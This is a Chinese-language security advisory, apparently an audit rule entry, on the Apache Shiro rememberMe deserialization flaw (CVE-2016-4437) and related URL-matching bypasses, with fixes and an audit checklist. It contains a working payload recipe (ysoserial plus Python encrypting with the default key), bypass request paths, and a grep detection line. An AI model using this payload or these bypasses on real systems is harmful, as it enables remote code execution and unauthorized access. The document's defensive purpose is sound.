# Shiro rememberMe 反序列化（CVE-2016-4437）

## 攻击链

1. 用户登录时勾选 "记住我"
2. Shiro 序列化 SimplePrincipalCollection → AES 加密 → Base64 → Cookie `rememberMe`
3. 下次请求 Shiro 从 Cookie 读取 → Base64 解码 → AES 解密 → **反序列化**
4. 若 AES key 已知（默认 key `kPH+bIxk5D2deZiIxcaaaA==`）→ 攻击者构造 payload → RCE

## Payload 生成

```bash
java -jar ysoserial.jar CommonsBeanutils1 "id" > payload.bin

python3 <<'EOF'
import base64
from Crypto.Cipher import AES

KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
mode = AES.MODE_CBC
iv = b'\x00' * 16
encryptor = AES.new(KEY, mode, iv)

with open("payload.bin", "rb") as f:
    plaintext = f.read()

# PKCS7 padding
pad_len = 16 - len(plaintext) % 16
plaintext += bytes([pad_len]) * pad_len
ciphertext = iv + encryptor.encrypt(plaintext)
print(base64.b64encode(ciphertext).decode())
EOF
```

发送：

```http
GET / HTTP/1.1
Cookie: rememberMe=<Base64>
```

## 硬编码默认 key

Shiro ≤ 1.2.4 硬编码 key `kPH+bIxk5D2deZiIxcaaaA==`。1.2.5+ 默认随机，但大量项目
沿用示例代码 = 仍是这个 key。

爆破工具 shiro-check 内置 40+ 常见 key。

## 修复

### 1. 换 Cipher 与 key

```java
CookieRememberMeManager manager = new CookieRememberMeManager();
byte[] cipherKey = generateRandomKey();  // 每次部署生成，写入外部配置
manager.setCipherKey(cipherKey);
```

**每个实例独立 key**：
- 从 env / KMS 注入
- 长度 16 / 24 / 32 字节
- 不要 commit 到代码

### 2. 升级版本 & 修复 CVE-2020-1957 / 2020-11989 / 2020-13933

- Shiro ≥ 1.7.1（多个 URL 匹配绕过）

### 3. 关闭 rememberMe（如不需要）

```java
@Bean
public DefaultWebSecurityManager securityManager() {
    DefaultWebSecurityManager sm = new DefaultWebSecurityManager();
    sm.setRememberMeManager(null);
    return sm;
}
```

### 4. 类白名单反序列化

替换默认 `DefaultSerializer` 为白名单版：

```java
public class SafeSerializer implements Serializer<Object> {
    private static final Set<String> ALLOWED = Set.of(
        "org.apache.shiro.subject.SimplePrincipalCollection",
        "java.util.HashSet",
        "java.util.HashMap",
        "com.myapp.User"
    );
    // ObjectInputStream 子类 resolveClass 校验
}
```

## 审计动作

- [ ] `shiro.ini` 或 Java Config 中 `securityManager.rememberMeManager.cipherKey` 是否硬编码
- [ ] 是否使用默认 key `kPH+bIxk5D2deZiIxcaaaA==` 或其他公开泄漏 key
- [ ] Shiro 版本 ≥ 1.7.1
- [ ] `rememberMe` 是否业务真的需要

```bash
grep -rn 'setCipherKey\|kPH+bIxk5D2deZiIxcaaaA' src/main/
```

## URL 匹配绕过（CVE-2020-11989 / CVE-2020-13933）

Shiro 的 URL 匹配基于 Ant 模式，与 Spring 的 URL 规范化存在差异。攻击者用：

```
GET /admin/;
GET /admin/%3B
GET /admin/..;/admin/xxx
```

Shiro 认为不匹配 `/admin/**` → 放行；Spring 规范化后仍进入 `/admin/xxx` Controller。

修复：升级到 1.7.1+，且用 `PathMatchingFilterChainResolver` 时避免依赖前缀匹配鉴权。

## 相关规则

- CWE: CWE-502 (Deserialization)
- CWE: CWE-798 (Hardcoded Key)
- CWE: CWE-287 (URL bypass)
- 内建 pattern: `shiro_default_key`
- CVSS: 9.8
